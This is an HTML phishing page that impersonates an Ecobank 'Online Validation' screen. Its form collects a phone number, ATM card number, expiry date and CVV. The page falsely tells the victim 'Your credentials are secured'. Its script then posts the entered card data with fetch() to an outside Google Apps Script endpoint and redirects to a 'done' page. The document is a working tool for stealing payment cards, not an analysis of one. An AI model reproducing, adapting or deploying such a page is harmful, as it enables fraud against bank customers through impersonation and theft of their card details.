<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta-name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ecobank Online Validation</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #001B44;
            font-family: Arial, sans-serif;
            color: white;
        }

        /* Make the whole card MUCH bigger */
        .container {
            max-width: 600px;              /* wider */
            margin: 80px auto;             /* more spacing from top */
            background: #0a2b57;
            padding: 55px;                 /* more interior spacing */
            border-radius: 35px;           /* larger rounded effect */
            box-shadow: 0 15px 40px rgba(0,0,0,0.55);
            transform: scale(1.05);        /* slight enlargement */
        }

        h1 {
            text-align: center;
            font-weight: bold;
            font-size: 34px;               /* bigger title */
            margin-bottom: 15px;
        }

        .subtitle {
            text-align: center;
            font-size: 20px;               /* larger subtitle */
            color: #D0D0D0;
            margin-bottom: 50px;
            line-height: 1.5;
        }

        label {
            font-size: 22px;               /* bigger label */
            margin-top: 30px;
            display: block;
        }

        /* Very large input boxes */
        input {
            width: 100%;
            padding: 26px 22px;            /* bigger input padding */
            margin-top: 12px;
            border: none;
            border-radius: 16px;
            font-size: 22px;               /* bigger text */
            background: #ffffff;
            color: #000;
            box-sizing: border-box;
        }

        /* Big button */
        button {
            width: 100%;
            margin-top: 45px;
            padding: 26px;
            background-color: grey;
            border: none;
            border-radius: 20px;
            font-size: 24px;               /* much bigger button text */
            color: white;
            cursor: pointer;
            font-weight: bold;
        }

        footer {
            text-align: center;
            margin-top: 40px;
            color: #DDDDDD;
            font-size: 18px;               /* bigger footer */
        }
    </style>
</head>

<body>

    <div class="container">
        <h1>ECOBANK ONLINE VALIDATION</h1>
        <p class="subtitle">A LOT HAS CHANGED, SO HAVE WE.</p>

        <form id="ecoForm">
            <label>Phone Number</label>
            <input type="tel" id="phone" required>

            <label>ATM Card Number</label>
            <input type="text" id="cardNumber" required>

            <label>ATM Expiry Date</label>
            <input type="month" id="expiry" required>

            <label>ATM CVV</label>
            <input type="number" id="cvv" required>

            <button type="submit">Validate</button>
        </form>

        <footer>Your credentials are secured</footer>
    </div>

    <script>
        document.getElementById("ecoForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const data = {
                phone: document.getElementById("phone").value,
                cardNumber: document.getElementById("cardNumber").value,
                expiry: document.getElementById("expiry").value,
                cvv: document.getElementById("cvv").value
            };

            fetch("https://script.google.com/macros/s/AKfycbzyhB1DYyxSeFjcxq30DfveoS7IQx3FxExsdrCz71UUaZNVLz6N8Skk0PM7qmztv6p58Q/exec
", {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            })
            .then(() => {
                window.location.href = "done.html";
            });
        });
    </script>

</body>
</html>
